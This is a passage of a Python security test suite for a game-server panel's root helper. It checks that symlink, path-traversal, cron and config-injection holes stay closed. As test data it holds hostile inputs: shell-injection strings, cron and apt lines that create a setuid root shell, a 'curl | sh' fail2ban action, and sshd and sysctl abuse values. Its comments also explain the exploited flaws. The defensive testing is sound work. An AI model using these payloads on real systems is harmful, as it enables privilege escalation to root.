        id, host, port, username = 1, "h", 22, "u"
        auth_method, sudo_enabled, is_local, linuxgsm_user = "key", True, False, ""

    _dep_hosts.install_game_dependencies(_DepSrv(), game_type="cod")
    _dep_cmd = _dep_seen.get("cmd", "")
    check("deps: the pipeline still escalates (so this test is testing the root path)",
          _dep_seen.get("kw", {}).get("sudo") is True, str(_dep_seen.get("kw")))
    for _payload in ("$(id", "`whoami`", "a;b", "/tmp/pwned"):
        check("deps: %r never reaches the root pipeline" % _payload, _payload not in _dep_cmd)
    check("deps: ...and the legitimate packages still do",
          "curl" in _dep_cmd and "libstdc++5:i386" in _dep_cmd, _dep_cmd[:120])
finally:
    _ld._text = _o_ld_text
    _dep_hosts._core.run_command, _dep_hosts.host_os_slug = _o_dep_run, _o_dep_slug
    _ld._mem.clear()

# The validator itself: an architecture qualifier is legal, a shell metacharacter is not.
eq("deps: a real package list survives _apt_pkgs",
   _dep_hosts._apt_pkgs(["curl", "libstdc++5:i386", "lib32gcc-s1", "python3"]),
   ["curl", "libstdc++5:i386", "lib32gcc-s1", "python3"])
eq("deps: _apt_pkgs drops anything that is not a package name",
   _dep_hosts._apt_pkgs(["curl", "$(id)", "a;b", "../x", "", "`w`"]), ["curl"])


# ── The destructive user verbs must refuse the PANEL'S OWN account ────────────────────────────
# `user-delete`, `user-delete-force`, `user-remove-home` and `user-kill-processes` take their name
# from the "server name" field of the install form — shape-checked against INSTANCE_NAME_RE and
# nothing more — and manage_servers' install job calls the first two whenever
# /home/<name>/linuxgsm.sh is absent. install.sh creates the panel's own account with
# `useradd --system`, giving it a uid below 1000 but NOT 0, so the uid-0 test let it straight
# through: installing a server named `lgsmpanel` ran `userdel -r lgsmpanel` and, as root,
# `rm -rf -- /home/lgsmpanel` — which is where panel.db, secret_key, cred_key, config.json and
# every panel backup live. Unrecoverable, because the backups were inside the tree being deleted.
# MANAGE_SERVERS was enough; no superadmin, no confirmation.
#
# Both sides are asserted. The helper is the check that runs on THIS host; privileged.py's copy is
# the ONLY check on the two paths the helper never sees — a remote host, which has no helper, and
# a local host still on the pre-helper wide sudo grant.
_pa_me = __import__("pwd").getpwuid(os.getuid()).pw_name
_pa_why = ""
try:
    _priv_mod = __import__("panel.security.privileged", fromlist=["x"])
    _priv_mod._destroyable_user(_pa_me)
except Exception as _e:
    _pa_why = str(_e)
check("privileged: _destroyable_user refuses the account the panel itself runs as",
      "panel" in _pa_why.lower(), "accepted %r (%r)" % (_pa_me, _pa_why))
check("privileged: ...and an ordinary game-server account is still accepted",
      _priv_mod._destroyable_user("codserver") == "codserver")

# ── The guard belongs on the FOUR destructive verbs, not on v_managed_user ────────────────────
# v_managed_user gates 20 verbs. Only four destroy anything, and the panel legitimately names its
# OWN account to several of the rest — `tailscale-set-operator` exists to pass it
# (tailscale_integration hands it _current_os_user()), and on a single-box install where LinuxGSM
# runs under the same account as the panel, the game-file reads and `crontab-list` take it too.
# Putting the refusal on v_managed_user refused ALL TWENTY: it broke the file browser, downloads,
# backups, cron and Tailscale operator setup on every install, to protect four verbs. Both halves
# are asserted here, because only the second half catches that regression.
for _dv in ("user-delete", "user-delete-force", "user-kill-processes", "user-remove-home"):
    _why = ""
    try:
        _priv_mod.helper_argv(_dv, [_pa_me])
    except Exception as _e:
        _why = str(_e)
    check("privileged: %s refuses the panel's own account" % _dv,
          bool(_why), "built an argv for %r" % _pa_me)
    check("privileged: %s still builds for a real game server" % _dv,
          _priv_mod.helper_argv(_dv, ["codserver"])[-1] == "codserver")
for _av, _aargs in (("tailscale-set-operator", [_pa_me]),
                    ("game-file-read", [_pa_me, "cfg/server.cfg"]),
                    ("game-dir-tar", [_pa_me, "serverfiles"]),
                    ("game-backup-read", [_pa_me, "b.tar.gz"]),
                    ("crontab-list", [_pa_me]),
                    ("user-create", [_pa_me])):
    _ok = True
    try:
        _priv_mod.helper_argv(_av, _aargs)
    except Exception as _e:
        _ok, _why = False, str(_e)
    check("privileged: %s still ACCEPTS the panel's own account" % _av, _ok,
          "refused %r (%s)" % (_pa_me, _why if not _ok else ""))
# Helper side: SUDO_UID is how it learns who invoked it on a root install.
#
# SKIPPED when the suite is run AS ROOT, because the premise does not hold there: this block asks
# whether the helper singles out "the panel's own account" among ordinary managed accounts, and
# root is refused by v_managed_user for a different and correct reason (uid 0). Run as root the
# last check raised ValueError("refusing a uid-0 account") — an uncaught exception at import time,
# which aborted the whole suite and took ~1,890 other checks with it. Found by running the suite
# as root on the test VPS. The panel itself never runs as root (it is a per-user install), so this
# is about the harness, not the boundary.
_pa_env = os.environ.get("SUDO_UID")
os.environ["SUDO_UID"] = str(os.getuid())
try:
    if os.getuid() == 0:
        for _n in ("helper: v_destroyable_user refuses the account that invoked it",
                   "helper: ...and an ordinary game-server account is still accepted",
                   "helper: v_managed_user itself still accepts it, so the 16 non-destructive "
                   "verbs work"):
            skip(_n, "suite running as root: uid 0 is refused for its own reason")
    else:
        _pa_h_why = ""
        try:
            _helper.v_destroyable_user(_pa_me)
        except Exception as _e:
            _pa_h_why = str(_e)
        check("helper: v_destroyable_user refuses the account that invoked it",
              "panel" in _pa_h_why.lower(), "accepted %r (%r)" % (_pa_me, _pa_h_why))
        check("helper: ...and an ordinary game-server account is still accepted",
              _helper.v_destroyable_user("codserver") == "codserver")
        check("helper: v_managed_user itself still accepts it, so the 16 non-destructive verbs work",
              _helper.v_managed_user(_pa_me) == _pa_me)
finally:
    if _pa_env is None:
        os.environ.pop("SUDO_UID", None)
    else:
        os.environ["SUDO_UID"] = _pa_env

# ── The three content verbs must not be steerable through a symlink ───────────────────────────
# The GMod shared-content box is the one corner of the helper that works INSIDE a home directory,
# and a home directory belongs to the account that lives in it. install.sh creates /home/lgsmpanel
# with `useradd --create-home`, and the panel creates one per game server — so "an attacker who
# owns a directory under /home for a name v_managed_user accepts" is not a hypothetical, it is the
# panel's own account and every game server it has ever installed.
#
# Each verb is driven for real, with HOME_ROOT redirected at a sandbox. Every attack is paired
# with the legitimate call it must not break, because a verb that refuses everything is not a fix.
import grp as _cs_grp
import stat as _cs_stat
from panel.ops.ssh_manager import gmod as _sm_gmod  # noqa: E402
_cs_tmp = _tempfile.mkdtemp(prefix="content-sym-")
_cs_me = __import__("pwd").getpwuid(os.getuid()).pw_name
_cs_home_root, _cs_home = os.path.join(_cs_tmp, "home"), os.path.join(_cs_tmp, "home", _cs_me)
os.makedirs(_cs_home)
_cs_saved_root, _cs_saved_cron = _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX
_helper.HOME_ROOT = _cs_home_root
_helper.CONTENT_CRON_PREFIX = os.path.join(_cs_tmp, "cron.d", "lgsm-gmod-content")
os.makedirs(os.path.join(_cs_tmp, "cron.d"))
try:
    # 1. content-dir-create: makedirs(exist_ok=True) accepts a SYMLINK to a directory (its check is
    #    isdir, which follows) and the chown/chmod after it followed too — so `ln -s /root
    #    ~/serverfiles` made root give /root away to the content account.
    _cs_victim = os.path.join(_cs_tmp, "victim")
    os.makedirs(_cs_victim)
    _CS_750 = _cs_stat.S_IRWXU | _cs_stat.S_IRGRP | _cs_stat.S_IXGRP
    os.chmod(_cs_victim, _CS_750)
    _cs_sf = os.path.join(_cs_home, _helper.CONTENT_SUBDIR)
    os.symlink(_cs_victim, _cs_sf)
    try:
        _helper.do_content_dir_create([_cs_me], "")
        _cs_dc_err = ""
    except OSError as _e:
        _cs_dc_err = type(_e).__name__
    check("helper content-dir-create: a symlinked serverfiles is refused, not followed",
          _cs_dc_err and _cs_stat.S_IMODE(os.stat(_cs_victim).st_mode) == _CS_750,
          "err=%r victim mode=%s" % (_cs_dc_err,
                                     oct(_cs_stat.S_IMODE(os.stat(_cs_victim).st_mode))))
    os.unlink(_cs_sf)
    _helper.do_content_dir_create([_cs_me], "")
    _helper.do_content_dir_create([_cs_me], "")        # and it is still idempotent
    check("helper content-dir-create: ...and a real one is still created 0700",
          os.path.isdir(_cs_sf) and not os.path.islink(_cs_sf)
          and _cs_stat.S_IMODE(os.stat(_cs_sf).st_mode) == 0o700,
          oct(_cs_stat.S_IMODE(os.stat(_cs_sf).st_mode)))

    # 2. content-grant-read: the g+rX walk read the mode with lstat (does not follow) and wrote it
    #    with chmod (does). A symlink's own mode is 0777, so every link in the tree ended as
    #    `chmod 0777` on its TARGET — /etc/shadow, /etc/sudoers.d, /etc/cron.d.
    _cs_tree = os.path.join(_cs_sf, "cstrike")
    os.makedirs(os.path.join(_cs_tree, "maps"))
    _cs_real = os.path.join(_cs_tree, "maps", "de_dust2.bsp")
    with open(_cs_real, "w", encoding="utf-8") as _fh:
        _fh.write("x")
    os.chmod(_cs_real, 0o600)
    _cs_exec = os.path.join(_cs_tree, "run.sh")
    with open(_cs_exec, "w", encoding="utf-8") as _fh:
        _fh.write("x")
    os.chmod(_cs_exec, _cs_stat.S_IRWXU)
    _cs_tf = os.path.join(_cs_tmp, "shadowish")
    with open(_cs_tf, "w", encoding="utf-8") as _fh:
        _fh.write("x")
    os.chmod(_cs_tf, 0o640)
    _cs_td = os.path.join(_cs_tmp, "sudoersd")
    os.makedirs(_cs_td)
    os.chmod(_cs_td, _cs_stat.S_IRWXU)
    os.symlink(_cs_tf, os.path.join(_cs_tree, "a"))
    os.symlink(_cs_td, os.path.join(_cs_tree, "b"))
    _helper.do_content_grant_read(
        [_cs_me, _cs_grp.getgrgid(__import__("pwd").getpwnam(_cs_me).pw_gid).gr_name,
         _cs_me, "cstrike"], "")
    check("helper content-grant-read: a symlink's 0777 does not land on its target",
          _cs_stat.S_IMODE(os.stat(_cs_tf).st_mode) == 0o640
          and _cs_stat.S_IMODE(os.stat(_cs_td).st_mode) == 0o700,
          "file=%s dir=%s" % (oct(_cs_stat.S_IMODE(os.stat(_cs_tf).st_mode)),
                              oct(_cs_stat.S_IMODE(os.stat(_cs_td).st_mode))))
    check("helper content-grant-read: ...and g+rX still reaches the real files",
          _cs_stat.S_IMODE(os.stat(_cs_real).st_mode) == 0o640
          and _cs_stat.S_IMODE(os.stat(_cs_exec).st_mode) == 0o750
          and _cs_stat.S_IMODE(os.stat(_cs_sf).st_mode) & 0o010,
          "file=%s exec=%s serverfiles=%s"
          % (oct(_cs_stat.S_IMODE(os.stat(_cs_real).st_mode)),
             oct(_cs_stat.S_IMODE(os.stat(_cs_exec).st_mode)),
             oct(_cs_stat.S_IMODE(os.stat(_cs_sf).st_mode))))

    # 3. content-cron-write: its stdin went to /etc/cron.d verbatim. A cron.d line carries a USER
    #    FIELD, so `* * * * * root <cmd>` was root, within the minute, across reboots — the exact
    #    hole WRITE_CONTENT closes for node-tools-cron, in the one cron writer that table does not
    #    reach (the destination is per-user, so it cannot be a fixed name).
    _cs_cron = "%s-%s" % (_helper.CONTENT_CRON_PREFIX, _cs_me)
    _cs_rc = _helper.do_content_cron_write(
        [_cs_me], "* * * * * root cp /bin/bash /tmp/rb && chmod u+s /tmp/rb\n")
    check("helper content-cron-write: a root cron line is refused",
          _cs_rc == 2 and not os.path.exists(_cs_cron),
          "rc=%s exists=%s" % (_cs_rc, os.path.exists(_cs_cron)))
    _cs_body = _sm_gmod._content_update_cron_body(_cs_me, ["gmodserver", "csgoserver"])
    _cs_rc = _helper.do_content_cron_write([_cs_me], _cs_body)
    check("helper content-cron-write: ...and the body the panel actually sends is written verbatim",
          _cs_rc == 0 and os.path.exists(_cs_cron)
          and open(_cs_cron, encoding="utf-8").read() == _cs_body, "rc=%s" % _cs_rc)
    # The user field is pinned to the ARGUMENT, not to whatever the body claims.
    _cs_rc = _helper.do_content_cron_write(
        [_cs_me], _cs_body.replace(" 0 %s /home/" % _cs_me, " 0 root /home/", 1))
    check("helper content-cron-write: the cron user field cannot name anyone but the argument",
          _cs_rc == 2, "rc=%s" % _cs_rc)

    # 4. gmod-mount-read: opened as root, through a path every component of which lives in that
    #    account's own home — so a symlinked mount.cfg printed any root-readable file into the UI.
    #    It goes through the download verbs' fork-and-drop now, so the path is only resolved once
    #    privileges are gone.
    _cs_secret = os.path.join(_cs_tmp, "shadow")
    with open(_cs_secret, "w", encoding="utf-8") as _fh:
        _fh.write("root:$6$SECRET")
    _cs_cfg = os.path.join(_cs_home, _helper.GMOD_CFG_SUBPATH)
    os.makedirs(_cs_cfg)
    os.symlink(_cs_secret, os.path.join(_cs_cfg, "mount.cfg"))
    _cs_r, _cs_w = os.pipe()
    _cs_saved_fd = os.dup(1)
    os.dup2(_cs_w, 1)
    os.close(_cs_w)
    try:
        _helper.do_gmod_mount_read([_cs_me], "")
    finally:
        sys.stdout.flush()
        os.dup2(_cs_saved_fd, 1)
        os.close(_cs_saved_fd)
    _cs_out = os.read(_cs_r, 65536).decode("utf-8", "replace")
    os.close(_cs_r)
    check("helper gmod-mount-read: a symlinked mount.cfg does not leak its target",
          "SECRET" not in _cs_out, repr(_cs_out[:80]))
    # The read itself: _as_game_user needs root to drop, so the drop is stood in for and what is
    # checked is that the verb hands it the right path and emits that file.
    os.unlink(os.path.join(_cs_cfg, "mount.cfg"))
    with open(os.path.join(_cs_cfg, "mount.cfg"), "w", encoding="utf-8") as _fh:
        _fh.write('"cstrike" "/home/cu/serverfiles/cstrike"\n')
    _cs_pw = __import__("pwd").getpwnam(_cs_me)
    _cs_fake = __import__("pwd").struct_passwd(
        (_cs_pw.pw_name, _cs_pw.pw_passwd, _cs_pw.pw_uid, _cs_pw.pw_gid, _cs_pw.pw_gecos,
         _cs_home, _cs_pw.pw_shell))
    _cs_seen = []
    _cs_real_pwd, _cs_real_drop = _helper.pwd, _helper._as_game_user
    _helper.pwd = type("P", (), {"getpwnam": staticmethod(lambda n: _cs_fake)})()
    _helper._as_game_user = lambda pw, p, emit: (_cs_seen.append(p), emit(os.path.realpath(p)))[0]
    _cs_r, _cs_w = os.pipe()
    _cs_saved_fd = os.dup(1)
    os.dup2(_cs_w, 1)
    os.close(_cs_w)
    try:
        _helper.do_gmod_mount_read([_cs_me], "")
    finally:
        sys.stdout.flush()
        os.dup2(_cs_saved_fd, 1)
        os.close(_cs_saved_fd)
        _helper.pwd, _helper._as_game_user = _cs_real_pwd, _cs_real_drop
    _cs_out = os.read(_cs_r, 65536).decode("utf-8", "replace")
    os.close(_cs_r)
    check("helper gmod-mount-read: ...and a real mount.cfg is still read, under the game user",
          _cs_out == '"cstrike" "/home/cu/serverfiles/cstrike"\n'
          and _cs_seen == [os.path.join(_cs_cfg, "mount.cfg")],
          "out=%r handed=%s" % (_cs_out, _cs_seen))
finally:
    _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX = _cs_saved_root, _cs_saved_cron
    _shutil.rmtree(_cs_tmp, ignore_errors=True)

# ── fail2ban's two runnable keys ──────────────────────────────────────────────────────────────
# These four write targets were allowed wholesale, on the reasoning that fail2ban config is
# declarative and the COMMANDS live in action.d/*.conf, which is not a write target. Two keys
# undercut that: a jail's `action` names a definition that fail2ban resolves by joining the value
# onto "action.d", and filter.d/linuxgsm-panel.conf IS a write target — so `action =
# ../filter.d/linuxgsm-panel` may load a file the caller just wrote, whose actionstart/actionban
# fail2ban runs as root on reload. I could not verify that traversal (no fail2ban here to test
# against), so this is a guard against a maybe — and it costs nothing, because the panel writes
# none of these keys and a legitimate value is a bare name.
_helper_src = open(_helper_path, encoding="utf-8").read()
_f2b_bad = [ln for ln in ("action = ../filter.d/linuxgsm-panel", "banaction = /tmp/evil",
                          "actionban = curl http://x | sh", "actionstart = /bin/sh -c id",
                          "banactionallports = ../../x", "filter = ../../etc/passwd",
                          "chain = ../x")
            if _helper._fail2ban_line_ok(ln)]
check("helper fail2ban: a value that names a path is refused for the keys that decide what RUNS",
      not _f2b_bad, "accepted: %s" % _f2b_bad)
_f2b_good = [ln for ln in ("action = iptables-multiport", "filter = linuxgsm-panel",
                           "action_mwl = sendmail-whois-lines", "[linuxgsm-panel]",
                           "enabled = true", "ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8",
                           "logpath = /var/log/auth.log",
                           "failregex = panel login (?:failed|blocked) from <HOST>$")
             if not _helper._fail2ban_line_ok(ln)]
check("helper fail2ban: ...and every other key, paths and regexes included, is untouched",
      not _f2b_good, "refused: %s" % _f2b_good)
# The bodies the PANEL actually sends have to pass, or the feature is simply broken.
from panel.ops.ssh_manager import hosts as _f2b_hosts                              # noqa: E402
_F2B_BODIES = {
    "fail2ban-panel-jail": _nsr_so._panel_f2b_jail_body("/var/log/auth.log", 5000, ["10.0.0.0/8"]),
    "fail2ban-panel-filter": _nsr_so._panel_f2b_filter_body(),
    "fail2ban-jail-local": ("[DEFAULT]\nbantime = 1h\nfindtime = 10m\nmaxretry = 5\n\n"
                            "[sshd]\nenabled = true\nport = 22\n"),
    "fail2ban-panel-whitelist": _f2b_hosts._f2b_dropin_ignoreip_body(["10.0.0.0/8", "100.64.0.1"]),
}
_f2b_rejected = [n for n, b in _F2B_BODIES.items()
                 if _helper.WRITE_CONTENT[n] is None
                 or not _helper._lines_match(b, _helper.WRITE_CONTENT[n])]
check("helper fail2ban: every body the panel writes is still accepted", not _f2b_rejected,
      "rejected: %s" % _f2b_rejected)

# ── lgsm-discover reads a user's files AS THAT USER ───────────────────────────────────────────
# Everything it reads lives inside a /home user's own directory, so every path component is theirs
# to replace: a symlink at ~/lgsm/config-lgsm/<x>/<x>.cfg made it a port-number oracle over any
# root-readable file, one at ~/lgsm/backup a directory-entry count, one at
# ~/lgsm/mods/installed-mods.txt a line count. Same class as the mount.cfg read. The fork-and-drop
# only engages as root — unprivileged there is no boundary — so what is checked here is that the
# drop is attempted and that the output is unchanged when it is not.
import inspect as _disc_inspect
_disc_src = _disc_inspect.getsource(_helper._discover_user)
check("helper lgsm-discover: the per-user read drops to that user before reading anything",
      "os.setgroups([])" in _disc_src and "os.setgid(pw.pw_gid)" in _disc_src
      and "os.setuid(pw.pw_uid)" in _disc_src and "os.fork()" in _disc_src,
      "no credential drop in _discover_user")
check("helper lgsm-discover: ...and it refuses to read if the drop did not take",
      "os.getuid() != pw.pw_uid or os.geteuid() == 0" in _disc_src
      and _disc_src.index("os.getuid() != pw.pw_uid") < _disc_src.index("_emit()\n            sys"),
      "no post-drop state check before the read")

# ── the restore copy pins BOTH directories, not just the file names ───────────────────────────
# O_NOFOLLOW covers the last component only, so islink(stage) followed by
# os.path.join(stage, member) was a check on a path and then a use of it: swap `stage` itself for
# a symlink in that window and root reads <somewhere else>/panel.db over the live one. A
# descriptor cannot be re-pointed once open.
check("helper restore: the staging and data directories are opened O_NOFOLLOW once, as fds",
      "os.O_DIRECTORY | os.O_NOFOLLOW" in _helper_src
      and "src_dir_fd=sdir, dst_dir_fd=ddir" in _helper_src,
      "restore_copy_members still joins paths")

# ── The restore must not follow a symlink out of the staging directory ────────────────────────
# The staging directory is FIXED, and the helper's own note says why that matters: root copying
# "whatever is in the directory you name" would let a caller stage a directory it cannot read and
# have root hand its contents back. But fixing the DIRECTORY says nothing about what the names
# INSIDE it resolve to — and the panel user owns that directory, because the panel is what creates
# it and unpacks the archive into it.
#
# The copy was `if os.path.isfile(src): shutil.copyfile(src, dst)`. Both follow symlinks, and this
# runs as root, so a compromised panel could have root do its reading and writing for it. Driven
# through restore_copy_members itself rather than a reimplementation of the loop — a test that
# reimplements the code it guards is exactly how this would have stayed invisible.
import stat as _rs_stat
_rs_tmp = _tempfile.mkdtemp(prefix="restore-sym-")
_rs_secret = os.path.join(_rs_tmp, "root_only")
with open(_rs_secret, "w", encoding="utf-8") as _fh:
    _fh.write("SECRET-THE-PANEL-USER-MUST-NOT-SEE")
_rs_data = os.path.join(_rs_tmp, "data")
_rs_stage = os.path.join(_rs_data, _helper.RESTORE_STAGE)
os.makedirs(_rs_stage)

# 1. A symlink staged under a member name must not be read through.
os.symlink(_rs_secret, os.path.join(_rs_stage, "cred_key"))
_rs_copied = _helper.restore_copy_members(_rs_stage, _rs_data)
_rs_landed = os.path.join(_rs_data, "cred_key")
check("helper restore: a symlinked staged member is not followed (no arbitrary read as root)",
      "cred_key" not in _rs_copied and not os.path.exists(_rs_landed),
      "copied=%s, landed=%r" % (_rs_copied,
                                open(_rs_landed).read() if os.path.exists(_rs_landed) else None))

# 2. A symlink at the DESTINATION must not be written through — that one is a root-owned file of
#    the attacker's choosing, i.e. a root shell rather than a disclosure.
os.unlink(os.path.join(_rs_stage, "cred_key"))
with open(os.path.join(_rs_stage, "secret_key"), "w", encoding="utf-8") as _fh:
    _fh.write("payload")
_rs_victim = os.path.join(_rs_tmp, "root_owned_target")
with open(_rs_victim, "w", encoding="utf-8") as _fh:
    _fh.write("original")
os.symlink(_rs_victim, os.path.join(_rs_data, "secret_key"))
_helper.restore_copy_members(_rs_stage, _rs_data)
check("helper restore: a symlinked DESTINATION is not written through (no arbitrary write as root)",
      open(_rs_victim, encoding="utf-8").read() == "original",
      "the victim file was overwritten with %r" % open(_rs_victim, encoding="utf-8").read())
os.unlink(os.path.join(_rs_data, "secret_key"))

# 3. Positive control: a REAL staged file is still restored, with its mode. Without this the two
#    checks above pass just as well against a copy that does nothing at all.
with open(os.path.join(_rs_stage, "config.json"), "w", encoding="utf-8") as _fh:
    _fh.write("{\"real\": true}")
os.chmod(os.path.join(_rs_stage, "config.json"), 0o600)
_rs_ok = _helper.restore_copy_members(_rs_stage, _rs_data)
_rs_dst = os.path.join(_rs_data, "config.json")
check("helper restore: a real staged file IS still copied (positive control)",
      "config.json" in _rs_ok and os.path.isfile(_rs_dst)
      and open(_rs_dst, encoding="utf-8").read() == "{\"real\": true}",
      "copied=%s" % (_rs_ok,))
check("helper restore: ...and it keeps the staged file's mode",
      _rs_stat.S_IMODE(os.stat(_rs_dst).st_mode) == 0o600,
      oct(_rs_stat.S_IMODE(os.stat(_rs_dst).st_mode)))

# 4. A staging directory that is itself a symlink is refused outright.
_rs_data2 = os.path.join(_rs_tmp, "data2")
os.makedirs(_rs_data2)
os.symlink(_rs_stage, os.path.join(_rs_data2, _helper.RESTORE_STAGE))
check("helper restore: a symlinked staging directory copies nothing",
      _helper.restore_copy_members(os.path.join(_rs_data2, _helper.RESTORE_STAGE), _rs_data2) == [],
      "it copied something")
_shutil.rmtree(_rs_tmp, ignore_errors=True)

# ── What may be written into a root-owned file ────────────────────────────────────────────────
# WRITE_TARGETS secures the path; the CONTENT was stdin, written verbatim, on the reasoning that
# it "is never an argument, so no amount of it can change what runs". True of the helper process,
# false of the destination: four of those files are read by something that executes what they
# contain, so `write-file` was a general run-as-root primitive for anyone who could call the
# helper — which, under the narrow sudoers grant, is the panel user.
_REAL_PAYLOADS = {
    "apt-auto-upgrades": ('APT::Periodic::Update-Package-Lists "1";\n'
                          'APT::Periodic::Unattended-Upgrade "1";\n'
                          'APT::Periodic::AutocleanInterval "7";\n'
                          'APT::Periodic::Download-Upgradeable-Packages "1";\n'),
    "sysctl-tailscale": "net.ipv4.ip_forward = 1\nnet.ipv6.conf.all.forwarding = 1\n",
    "sshd-port-dropin": "# Managed by LinuxGSM Panel.\nPort 22\nPort 2222\n",
}
_ROOT_EXEC = [
    ("apt-auto-upgrades", 'APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb";};'),
    ("sysctl-tailscale", "kernel.core_pattern=|/home/panel/x.sh"),
    ("sshd-port-dropin", "AuthorizedKeysCommand /tmp/x\nAuthorizedKeysCommandUser root"),
    ("sshd-port-dropin", "PermitRootLogin yes"),
]


def _write_through_helper(target, content):
    """Drive do_write_file for real, against a temp destination, and return (rc, written-or-None).

    Deliberately NOT a call to _lines_match: the first version of this check tested the GRAMMAR
    and passed with do_write_file's enforcement deleted — the rule was right and nothing consulted
    it. Mutation caught that. Going through the function is the only way the test covers the thing
    that actually protects the file."""
    _tmpd = _tempfile.mkdtemp(prefix="panel-write-")
    _dest = os.path.join(_tmpd, "out.conf")
    _saved = _helper.WRITE_TARGETS[target]
    _helper.WRITE_TARGETS[target] = (_dest, 0o644)
    try:
        rc = _helper.do_write_file([target], content)
        written = open(_dest, encoding="utf-8").read() if os.path.exists(_dest) else None
        return rc, written
    finally:
        _helper.WRITE_TARGETS[target] = _saved
        _shutil.rmtree(_tmpd, ignore_errors=True)


_rejected_real = [_k for _k, _v in _REAL_PAYLOADS.items() if _write_through_helper(_k, _v)[0] != 0]
check("helper: every payload the panel actually sends is still written", not _rejected_real,
      "a real payload would now be refused: %s" % _rejected_real)
_accepted_exec = []
for _k, _v in _ROOT_EXEC:
    _rc, _written = _write_through_helper(_k, _v)
    if _rc == 0 or _written is not None:
        _accepted_exec.append("%s: %s" % (_k, _v[:34]))
check("helper: content that would execute as root is refused, and nothing is written",
      not _accepted_exec, "accepted: %s" % _accepted_exec)
_rc_cron, _written_cron = _write_through_helper("node-tools-cron", "* * * * * root id > /tmp/pwned")
check("helper: a hostile cron body is replaced by the helper's own, not written",
      _rc_cron == 0 and _written_cron == _helper.NODE_TOOLS_CRON_BODY,
      "rc=%s wrote=%r" % (_rc_cron, (_written_cron or "")[:60]))
check("helper: the cron body is the helper's own, not the caller's",
      _helper.WRITE_CONTENT["node-tools-cron"] is None
      and "npm install -g npm gamedig" in _helper.NODE_TOOLS_CRON_BODY)
check("helper: every write destination has a content rule (a new one cannot inherit 'anything')",
      set(_helper.WRITE_TARGETS) == set(_helper.WRITE_CONTENT),
      "targets without a rule: %s" % sorted(set(_helper.WRITE_TARGETS) - set(_helper.WRITE_CONTENT)))

# ── The download verbs' own halves, exercised directly ────────────────────────────────────────
# _as_game_user forks and drops credentials, which needs root and so cannot run here. The two
# halves that CAN be checked without it are the ones that decide what gets opened: the lexical
# containment check, and the two emitters.
_dl_root = _tempfile.mkdtemp()
try:
    _fake_home = os.path.join(_dl_root, "home", "codserver")
    os.makedirs(os.path.join(_fake_home, "addons", "sub"))
    open(os.path.join(_fake_home, "server.cfg"), "w").write("hostname x\n")
    open(os.path.join(_fake_home, "addons", "a.vpk"), "wb").write(b"\x00\x01binary")
    open(os.path.join(_fake_home, "addons", "sub", "b.txt"), "w").write("deep\n")
    os.symlink("/etc/passwd", os.path.join(_fake_home, "addons", "escape"))

    _pw = NS(pw_dir=_fake_home, pw_uid=os.getuid(), pw_gid=os.getgid())
    _orig_getpwnam = _helper.pwd.getpwnam
    try:
        _helper.pwd.getpwnam = lambda u: _pw if u == "codserver" else _orig_getpwnam(u)
        eq("helper: a relative path resolves under the game user's home",
           _helper._game_home_path("codserver", "addons/a.vpk")[1],
           os.path.join(_fake_home, "addons", "a.vpk"))
        # The home directory comes from the PASSWD ENTRY, so these are refused by the join itself
        # and not by string-matching what the caller sent.
        for _esc in ("../../etc/passwd", "addons/../../../etc/shadow"):
            check("helper: %r does not resolve into the home dir" % _esc,
                  _helper._game_home_path("codserver", _esc) == (None, None))
        check("helper: an unknown user resolves to nothing",
              _helper._game_home_path("nosuchuser-zz", "server.cfg") == (None, None))

        _buf = _io.BytesIO()
        _helper._emit_file(os.path.join(_fake_home, "addons", "a.vpk"), _buf)
        eq("helper: _emit_file copies bytes verbatim, binary included",
           _buf.getvalue(), b"\x00\x01binary")
        check("helper: _emit_file refuses a directory rather than emitting something odd",
              _ufw_raises(lambda: _helper._emit_file(_fake_home, _io.BytesIO())))

        _tarbuf = _io.BytesIO()
        _helper._emit_dir_tar(os.path.join(_fake_home, "addons"), _tarbuf)
        _tarbuf.seek(0)
        with _tarfile.open(fileobj=_tarbuf, mode="r|gz") as _tf:
            _members = {m.name: m for m in _tf}
        check("helper: the archive is not empty, so the layout claim examines members",
              len(_members) >= 1, "no tar members — the next check would pass vacuously")
        check("helper: the archive has ONE root named after the folder, not the whole host path",
              _members and all(n == "addons" or n.startswith("addons/") for n in _members),
              str(sorted(_members)))
        eq("helper: nested files keep their relative layout",
           sorted(n for n in _members if n.endswith((".vpk", ".txt"))),
           ["addons/a.vpk", "addons/sub/b.txt"])
        # A symlink is STORED as a symlink. If it were followed, an archive of any folder would be
        # a way to read files the walk never entered — /etc/passwd here.
        _link = _members.get("addons/escape")
        check("helper: a symlink is stored as a link, never followed into its target",
              _link is not None and _link.issym() and _link.size == 0, str(_link))
        check("helper: _emit_dir_tar refuses a plain file",
              _ufw_raises(lambda: _helper._emit_dir_tar(
                  os.path.join(_fake_home, "server.cfg"), _io.BytesIO())))
    finally:
        _helper.pwd.getpwnam = _orig_getpwnam
finally:
    _shutil.rmtree(_dl_root, ignore_errors=True)

# The helper can only ever run tools it names. bash is the whole point: if it resolved, the boundary
# would be decorative.
check("helper: resolves ufw", _helper.resolve("ufw").endswith("/ufw") if os.path.exists("/usr/sbin/ufw") else True)
check("helper: knows exactly the tools its verbs need, and no more",
      sorted(_helper.TOOLS) == ["add-apt-repository", "apt-get", "bash_installer", "crontab",
                                "curl", "df", "dpkg",
                                "fail2ban-client", "fallocate", "fuser", "groupadd", "journalctl",
                                "mkswap",
                                "npm", "passwd", "pgrep", "pkill", "pro", "reboot", "renice", "rm",
                                "sh_installer", "ss", "sshd", "swapon", "sysctl",
                                "systemctl", "systemd-run",
                                "tail", "tailscale", "timedatectl", "ufw", "useradd", "userdel",
                                "usermod"],
      sorted(_helper.TOOLS))
# bash_installer exists so the self-update can run ONE fixed root-owned file. The general shell
# must stay unresolvable under its own name, or any future verb could build ["bash", "-c", ...].
check("helper: bash_installer points at a real shell, and only INSTALLER_PATH uses it",
      _helper.TOOLS["bash_installer"] == ("/bin/bash", "/usr/bin/bash"))
for _prog in ("bash", "sh", "python3", "env"):
    check("helper: refuses to resolve %s" % _prog, _ufw_raises_fnf(_helper.resolve, _prog))

# Validators. Each of these reached a root shell as text before; now they are rejected outright.
_BAD = {
    "ufw-delete-deny-ip": ["1.2.3.4; rm -rf /", "$(id)", "any", "", "1.2.3.4 -x", "0"],
    "ufw-limit-port": ["22; reboot", "0", "65536", "22/sctp", "-1", "$(id)"],
